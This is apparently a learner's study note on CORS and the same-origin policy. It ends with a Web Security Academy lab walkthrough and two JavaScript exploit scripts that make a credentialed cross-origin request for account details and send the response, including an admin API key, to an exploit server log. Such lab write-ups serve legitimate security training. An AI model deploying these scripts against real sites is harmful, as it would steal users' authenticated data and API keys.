### What is CORS?

*Cross Origin Resource Sharing*

Is a browser mechanism that allows access to resources outside of the domain.
This does not a protection against CSRF.

It could allow for cross-domain attacks if misconfigured or implemented incorrectly.

### Same-Origin policy

Is a defensive mechanism that limits websites interaction with outside domains.
To prevent stealing data or performing malicious actions.

It generally allows requests to other domains but not to access the responses.

### Relaxation of the same-origin policy

The same-origin policy is very restrictive.
But often websites need interaction with 3-rd party sites or subdomains that require `full cross-origin access`.

Relaxation of the same-origin policy is possible using CORS.

The CORS protocol uses a `suite of HTTP headers`.
They define trusted origins and if authenticated access is permitted.

These headers are exchanged between browser and cross-origin website that it's trying to access.

### CORS misconfiguration vulnerabilities

Modern websites use CORS to allow for cross-origin interaction.
They could be misconfigured or be too lenient to ensure functionality.

**LAB** - CORS vuln with basic origin reflection
Attain admin API key buy exploiting CORS which trusts all origins, craft some JS and upload it to the exploit server.

**Solution** - The /accountDetails endpoint returns json response of account details.

Using this endpoint we see that response contains `Access-Control-Allow-Credentials: true` header.
This means we can send request with authentication.

Now to test cross-origin.
Our request to the endpoint, we add header `Origin: https://reab.com`.
In response `Access-Control-Allow-Origin: https://reab.com` the custom origin is allowed.

This confirms the CORS vulnerability, meaning we host our own malicious server with script and send the request on behalf of the authenticated user.

```javascript
// this is my script that for some reason donesn't work
<script> 

let url = "https://0adf00ff032c212780528f0200ec001e.web-security-academy.net/accountDetails";

fetch(url, { credentials : 'include', method : 'GET' })
    .then(response => response.text())
    .then(data => {
	    location = '/log?result=' + btoa(data);
    });
    
</script>
```

```javascript
// original solution
<script>

var req = new XMLHttpRequest();

req.onload = reqListener;
req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials = true; req.send();

function reqListener() {
	location='/log?key='+this.responseText;
};

</script>
```